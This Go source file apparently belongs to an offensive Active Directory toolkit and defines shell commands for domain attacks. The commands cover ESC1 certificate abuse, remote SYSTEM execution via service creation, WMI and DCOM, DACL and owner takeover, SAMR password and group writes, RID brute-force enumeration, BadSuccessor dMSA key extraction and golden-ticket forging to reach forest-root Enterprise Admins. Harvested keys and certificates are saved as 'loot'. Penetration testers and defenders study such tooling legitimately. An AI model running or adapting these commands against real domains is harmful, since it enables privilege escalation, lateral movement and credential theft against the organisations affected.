package shell

// Shell commands for the tier-1/2 feature set (SCMR/WMI/DCOM execution,
// DACL/owner primitives, SAMR writes, LSA SID sweep, dMSA, raiseChild).
// Kept out of shell.go to keep that file focused; conventions mirror
// shell.go: commands return data via the session, print via internal/ui,
// recoverable failures go through opError, and transient channels are
// announced before use (WMI methods self-announce inside smbclient).

import (
	"fmt"
	"strconv"
	"strings"

	"anvil/internal/adenum"
	"anvil/internal/dmsa"
	"anvil/internal/smbclient"
	"anvil/internal/track"
	"anvil/internal/ui"
)

// outPath extracts a `--out <file>` value from command args, resolved
// against the session loot dir (bare filenames land there). bad reports
// that --out was given without a value — a usage error.
func (s *shell) outPath(args []string) (out string, bad bool) {
	for i, a := range args {
		if strings.EqualFold(a, "--out") {
			if i+1 >= len(args) {
				return "", true
			}
			return s.lootPath(args[i+1]), false
		}
	}
	return "", false
}

// writeLoot writes hash/secret lines to the loot file and confirms; a
// failed write is a warm warning, never fatal to the session.
func (s *shell) writeLoot(out, header string, lines []string) {
	if err := WriteLootLines(out, header, lines); err != nil {
		ui.Warm.Printf("  warning: could not write loot: %v\n", err)
		return
	}
	ui.Faint.Printf("  wrote %d lines to %s\n", len(lines), out)
}

// cmdTrusts lists domain trust relationships over one transient LDAP
// channel (announced). A single-domain forest prints "no trusts".
func (s *shell) cmdTrusts() {
	ui.Faint.Println("  opening LDAP channel")
	trusts, err := adenum.Trusts(s.sess.Host(), s.sess.Creds())
	if err != nil {
		s.opError(err)
		return
	}
	if len(trusts) == 0 {
		ui.Faint.Println("  no trusts")
		return
	}
	rows := make([][]tableCell, 0, len(trusts))
	for _, t := range trusts {
		rows = append(rows, rowCells(t.Name, t.Direction, t.Type, t.Attributes))
	}
	printTable([]string{"NAME", "DIRECTION", "TYPE", "ATTRIBUTES"}, rows)
}

// cmdWhoAmI prints the session user, SID, and full (nested) group
// memberships — the operator's whoami /groups.
func (s *shell) cmdWhoAmI() {
	ui.Faint.Println("  opening LDAP channel")
	info, err := s.sess.WhoAmI()
	if err != nil {
		s.opError(err)
		return
	}
	fmt.Printf("  %s %s\n", ui.Muted.Sprint("USER"), info.User)
	fmt.Printf("  %s %s\n", ui.Muted.Sprint("SID"), ui.Faint.Sprint(info.SID))
	if len(info.Groups) == 0 {
		ui.Faint.Println("  (no group memberships resolved)")
		return
	}
	rows := make([][]tableCell, 0, len(info.Groups))
	for _, g := range info.Groups {
		name := g.Name
		if name == "" {
			name = "-"
		}
		rows = append(rows, rowCells(name, g.SID))
	}
	printTable([]string{"GROUP", "SID"}, rows)
}

// cmdCertreq requests a certificate from the domain's enterprise CA
// (MS-ICPR over the session's cert pipe): certreq <template> [-cn <name>]
// [-san <upn>] [-ca <host\CA-Name>] [-out <file.pem>]. The enrollee-
// supplied SAN is the ESC1 primitive — pair with `adenum adcs`.
func (s *shell) cmdCertreq(args []string) {
	var template, cn, san, ca, out string
	for i := 0; i < len(args); i++ {
		next := func() string {
			if i+1 < len(args) {
				i++
				return args[i]
			}
			return ""
		}
		switch strings.ToLower(args[i]) {
		case "-cn":
			cn = next()
		case "-san":
			san = next()
		case "-ca":
			ca = next()
		case "-out":
			out = next()
		default:
			if template == "" && !strings.HasPrefix(args[i], "-") {
				template = args[i]
			} else {
				fmt.Printf("  %s\n", ui.Muted.Sprint("usage: certreq <template> [-cn <name>] [-san <upn>] [-ca <host\\CA-Name>] [-out <file.pem>]"))
				return
			}
		}
	}
	if template == "" {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: certreq <template> [-cn <name>] [-san <upn>] [-ca <host\\CA-Name>] [-out <file.pem>]"))
		return
	}

	var caHost, caName string
	if ca != "" {
		parts := strings.SplitN(ca, `\`, 2)
		if len(parts) != 2 {
			fmt.Printf("  %s\n", ui.Muted.Sprint("-ca wants <host\\CA-Name>"))
			return
		}
		caHost, caName = parts[0], parts[1]
	} else {
		ui.Faint.Println("  opening LDAP channel")
		var err error
		caHost, caName, err = s.sess.FindCA()
		if err != nil {
			s.opError(err)
			return
		}
	}
	ui.Faint.Printf("  CA: %s\\%s\n", caHost, caName)

	if cn == "" {
		cn = s.sess.Creds().Username
	}
	ui.Faint.Printf("  requesting %s certificate for %s\n", template, cn)
	if san != "" {
		ui.Faint.Printf("  SAN: %s (enrollee-supplied subject)\n", san)
	}

	detail := cn
	if san != "" {
		detail += " san=" + san
	}
	res, err := s.sess.CertRequest(caHost, caName, template, cn, san)
	s.trackOp(track.CategoryAD, "certreq", template, detail, err)
	if err != nil {
		s.opError(err)
		return
	}
	ui.Faint.Printf("  issued: %s\n", res.Subject)

	if out == "" {
		out = s.lootPath(template + "-" + cn + ".pem")
	}
	if err := smbclient.WriteCertPEM(out, res.CertPEM, res.KeyPEM); err != nil {
		ui.Warm.Printf("  warning: could not write cert: %v\n", err)
		return
	}
	ui.Faint.Printf("  wrote cert+key to %s\n", out)
}

// printExecOutcome renders one remote-execution result in cmdExec's idiom.
func (s *shell) printExecOutcome(method, cmdLine, out string, warnings []string, err error) {
	s.trackOp(track.CategoryExec, method, cmdLine, "", err)
	for _, w := range warnings {
		ui.Warm.Printf("  warning: %s\n", w)
	}
	if err != nil {
		s.opError(err)
		return
	}
	if out == "" {
		ui.Faint.Println("  (no output)")
		return
	}
	fmt.Print(out)
	if !strings.HasSuffix(out, "\n") {
		fmt.Println()
	}
}

// cmdPSExec runs a command as SYSTEM via a temporary Windows service
// (smbexec method). Rides the SMB session's svcctl pipe; needs admin.
// cmdLine is the verbatim remainder of the input line.
func (s *shell) cmdPSExec(cmdLine string) {
	if cmdLine == "" {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: psexec <command...>"))
		return
	}
	out, warnings, err := s.sess.ExecService(cmdLine)
	s.printExecOutcome("psexec", cmdLine, out, warnings, err)
}

// cmdWMIExec runs a command via Win32_Process.Create (announces its own
// transient DCOM channel). Needs admin; runs as the connected user.
func (s *shell) cmdWMIExec(cmdLine string) {
	if cmdLine == "" {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: wmiexec <command...>"))
		return
	}
	out, warnings, err := s.sess.ExecWMI(cmdLine)
	s.printExecOutcome("wmiexec", cmdLine, out, warnings, err)
}

// cmdDCOMExec runs a command via DCOM shell objects. Needs admin; hardened
// servers often refuse remote activation of GUI-hosted classes.
func (s *shell) cmdDCOMExec(cmdLine string) {
	if cmdLine == "" {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: dcomexec <command...>"))
		return
	}
	ui.Faint.Println("  opening DCOM channel")
	out, warnings, err := s.sess.ExecDCOM(cmdLine)
	s.printExecOutcome("dcomexec", cmdLine, out, warnings, err)
}

// cmdWMIQuery runs a WQL query against root\cimv2 and prints the result
// set as a table (self-announcing DCOM channel). wql is the verbatim
// remainder of the input line — quotes in WQL string literals are data.
func (s *shell) cmdWMIQuery(wql string) {
	if wql == "" {
		fmt.Printf("  %s\n", ui.Muted.Sprint(`usage: wmiquery <WQL> (e.g. SELECT Name, State FROM Win32_Service)`))
		return
	}
	res, err := s.sess.WMIQuery(wql)
	if err != nil {
		s.opError(err)
		return
	}
	if len(res.Rows) == 0 {
		ui.Faint.Println("  (no rows)")
		return
	}
	widths := make([]int, len(res.Columns))
	for i, c := range res.Columns {
		widths[i] = len(c)
	}
	for _, row := range res.Rows {
		for i, c := range res.Columns {
			if l := len(row[c]); l > widths[i] {
				widths[i] = l
			}
		}
	}
	line := "  "
	for i, c := range res.Columns {
		line += fmt.Sprintf("%-*s  ", widths[i], c)
	}
	ui.Muted.Println(line)
	for _, row := range res.Rows {
		line = "  "
		for i, c := range res.Columns {
			line += fmt.Sprintf("%-*s  ", widths[i], row[c])
		}
		fmt.Println(line)
	}
	ui.Faint.Printf("  %d rows\n", len(res.Rows))
}

// cmdDACLEdit reads, grants, or revokes DACL ACEs on an AD object.
// One transient LDAP channel per op.
//
//	dacledit <target>                                    read
//	dacledit <target> -p <user> -grant <rights> [-deny] [-inherit]
//	dacledit <target> -p <user> -revoke [rights]
func (s *shell) cmdDACLEdit(args []string) {
	if len(args) < 1 {
		s.daclUsage()
		return
	}
	target := args[0]
	var principal, rights, mode string
	var denied, inherit bool
	for i := 1; i < len(args); i++ {
		switch strings.ToLower(args[i]) {
		case "-p":
			if i+1 < len(args) {
				principal = args[i+1]
				i++
			}
		case "-grant":
			mode = "grant"
			if i+1 < len(args) {
				rights = args[i+1]
				i++
			}
		case "-revoke":
			mode = "revoke"
			if i+1 < len(args) && !strings.HasPrefix(args[i+1], "-") {
				rights = args[i+1]
				i++
			}
		case "-deny":
			denied = true
		case "-inherit":
			inherit = true
		default:
			fmt.Printf("  %s\n", ui.Muted.Sprintf("unexpected argument %q", args[i]))
			s.daclUsage()
			return
		}
	}

	ui.Faint.Println("  opening LDAP channel")
	switch mode {
	case "grant":
		if principal == "" || rights == "" {
			s.daclUsage()
			return
		}
		added, err := s.sess.WriteDACL(target, principal, rights, denied, inherit)
		s.trackOp(track.CategoryAD, "dacledit grant", target, principal+" "+rights, err)
		if err != nil {
			s.opError(err)
			return
		}
		ui.Faint.Printf("  added %d ACE(s): %s gets %s on %s\n", added, principal, rights, target)
	case "revoke":
		if principal == "" {
			s.daclUsage()
			return
		}
		removed, err := s.sess.RemoveDACL(target, principal, rights)
		s.trackOp(track.CategoryAD, "dacledit revoke", target, principal, err)
		if err != nil {
			s.opError(err)
			return
		}
		ui.Faint.Printf("  removed %d ACE(s) for %s on %s\n", removed, principal, target)
	default:
		dn, entries, err := s.sess.GetDACL(target)
		if err != nil {
			s.opError(err)
			return
		}
		ui.Muted.Printf("  %s  %s\n", "TARGET", dn)
		ui.Muted.Printf("  %-5s %-16s %-24s %s\n", "IDX", "TYPE", "TRUSTEE", "RIGHTS")
		for _, e := range entries {
			trustee := e.Trustee
			if trustee == "" {
				trustee = ui.Faint.Sprint(e.SID)
			}
			rights := e.Rights
			if e.ObjectType != "" {
				rights += " " + ui.Faint.Sprintf("(%s)", e.ObjectType)
			}
			if e.Flags != "" {
				rights += " " + ui.Faint.Sprintf("[%s]", e.Flags)
			}
			fmt.Printf("  %-5d %-16s %-24s %s\n", e.Index, e.ACEType, trustee, rights)
		}
		ui.Faint.Printf("  %d ACEs\n", len(entries))
	}
}

func (s *shell) daclUsage() {
	fmt.Printf("  %s\n", ui.Muted.Sprint("usage: dacledit <target> [-p user -grant <rights> [-deny] [-inherit] | -p user -revoke [rights]]"))
	ui.Faint.Printf("  rights presets: %s\n", smbclient.RightsPresetNames())
}

// cmdOwnerEdit reads or sets an AD object's owner. One transient LDAP
// channel per op.
func (s *shell) cmdOwnerEdit(args []string) {
	if len(args) < 1 {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: owneredit <target> [-set <user>]"))
		return
	}
	target := args[0]
	ui.Faint.Println("  opening LDAP channel")
	if len(args) >= 3 && strings.EqualFold(args[1], "-set") {
		prev, err := s.sess.SetOwner(target, args[2])
		s.trackOp(track.CategoryAD, "owneredit set", target, args[2], err)
		if err != nil {
			s.opError(err)
			return
		}
		ui.Faint.Printf("  owner of %s set to %s (was %s)\n", target, args[2], prev)
		return
	}
	dn, info, err := s.sess.GetOwner(target)
	if err != nil {
		s.opError(err)
		return
	}
	ui.Muted.Printf("  %s  %s\n", "TARGET", dn)
	name := info.Name
	if name == "" {
		name = ui.Faint.Sprint("(unresolved)")
	}
	fmt.Printf("  %-24s %s\n", name, info.SID)
}

// cmdSAMPassword changes a user's password via SAMR (needs the old one;
// no LDAP channel — rides the SMB session's samr pipe).
func (s *shell) cmdSAMPassword(args []string) {
	if len(args) < 3 {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: sampasswd <user> <newpassword> <oldpassword>"))
		return
	}
	err := s.sess.SetPasswordSAMR(args[0], args[1], args[2])
	s.trackOp(track.CategoryAD, "sampasswd", args[0], "", err)
	if err != nil {
		s.opError(err)
		return
	}
	ui.Faint.Printf("  password changed for %s via SAMR\n", args[0])
}

// cmdSAMGroup adds or removes a group member via SAMR (domain groups and
// Builtin aliases like Remote Desktop Users).
func (s *shell) cmdSAMGroup(add bool, args []string) {
	verb := "samdel"
	if add {
		verb = "samadd"
	}
	if len(args) < 2 {
		fmt.Printf("  %s\n", ui.Muted.Sprintf("usage: %s <group> <user>", verb))
		return
	}
	var err error
	if add {
		err = s.sess.AddGroupMember(args[0], args[1])
	} else {
		err = s.sess.RemoveGroupMember(args[0], args[1])
	}
	s.trackOp(track.CategoryAD, verb, args[0], args[1], err)
	if err != nil {
		s.opError(err)
		return
	}
	ui.Faint.Printf("  %s: %s %s %s\n", verb, args[1], map[bool]string{true: "added to", false: "removed from"}[add], args[0])
}

// cmdLookupSid brute-forces account names by RID over LSA (read-only,
// rides the session's lsarpc pipe).
func (s *shell) cmdLookupSid(args []string) {
	start, end := uint32(500), uint32(4000)
	if len(args) >= 1 {
		v, err := strconv.ParseUint(args[0], 10, 32)
		if err != nil {
			fmt.Printf("  %s\n", ui.Muted.Sprint("usage: lookupsid [startRID] [endRID]"))
			return
		}
		start = uint32(v)
	}
	if len(args) >= 2 {
		v, err := strconv.ParseUint(args[1], 10, 32)
		if err != nil {
			fmt.Printf("  %s\n", ui.Muted.Sprint("usage: lookupsid [startRID] [endRID]"))
			return
		}
		end = uint32(v)
	}
	domainSID, entries, err := s.sess.LookupSids(start, end)
	if len(entries) > 0 {
		ui.Muted.Printf("  %-6s %-36s %s\n", "RID", "NAME", "TYPE")
		for _, e := range entries {
			fmt.Printf("  %-6d %-36s %s\n", e.RID, e.Domain+"\\"+e.Name, e.Type)
		}
		ui.Faint.Printf("  %d SIDs resolved under %s\n", len(entries), domainSID)
	}
	if err != nil {
		s.opError(err)
		return
	}
	if len(entries) == 0 {
		ui.Faint.Println("  no SIDs resolved")
	}
}

// cmdBadSuccessor enumerates dMSA objects or requests a dMSA's keys
// (BadSuccessor, CVE-2025-53779 — Windows Server 2025 DCs only; older
// domains get a themed not-supported).
func (s *shell) cmdBadSuccessor(args []string) {
	mode := "enum"
	if len(args) >= 1 {
		mode = strings.ToLower(args[0])
	}
	switch mode {
	case "enum":
		ui.Faint.Println("  opening LDAP channel")
		accounts, err := s.sess.FindDMSAs()
		if err != nil {
			s.opError(err)
			return
		}
		if len(accounts) == 0 {
			ui.Faint.Println("  no dMSA objects found")
			return
		}
		ui.Muted.Printf("  %-20s %-12s %-24s %s\n", "NAME", "STATE", "SUPERSEDES", "KEY RETRIEVAL PRINCIPALS")
		for _, a := range accounts {
			fmt.Printf("  %-20s %-12s %-24s %s\n", a.Name, a.StateName(), a.PrecededBy, strings.Join(a.PrincipalsAllowed, ", "))
		}
		ui.Faint.Printf("  %d dMSA accounts\n", len(accounts))
	case "keys":
		if len(args) < 2 {
			fmt.Printf("  %s\n", ui.Muted.Sprint("usage: badsuccessor keys <dmsa$>"))
			return
		}
		ui.Faint.Println("  opening KDC channel")
		reply, err := s.sess.GetDMSAKeys(args[1])
		if err != nil {
			s.opError(err)
			return
		}
		if reply.Package != nil {
			ui.Muted.Printf("  %-10s %s\n", "KEY SET", "VALUE")
			for _, k := range reply.Package.CurrentKeys {
				fmt.Printf("  %-10s %x\n", dmsa.ETypeName(k.Type), k.Value)
			}
			for _, k := range reply.Package.PreviousKeys {
				fmt.Printf("  %-10s %x\n", "prev:"+dmsa.ETypeName(k.Type), k.Value)
			}
		}
	default:
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: badsuccessor [enum|keys <dmsa$>]"))
	}
}

// cmdRaiseChild forges a forest-root Enterprise Admins golden ticket via
// SIDHistory when the connected domain is a child of a multi-domain forest.
func (s *shell) cmdRaiseChild(args []string) {
	if len(args) < 1 {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: raisechild <child-krbtgt-hash> [out.ccache]"))
		return
	}
	out := ""
	if len(args) > 1 {
		out = args[1]
	}
	ui.Faint.Println("  opening LDAP channel")
	path, err := s.sess.RaiseChild(args[0], out)
	if err != nil {
		s.opError(err)
		return
	}
	ui.Faint.Printf("  ccache written to %s\n", path)
	ui.Faint.Println("  use: KRB5CCNAME=" + path + " anvil connect -k -u Administrator -d <forest-root> --host <parent-dc-fqdn>")
}
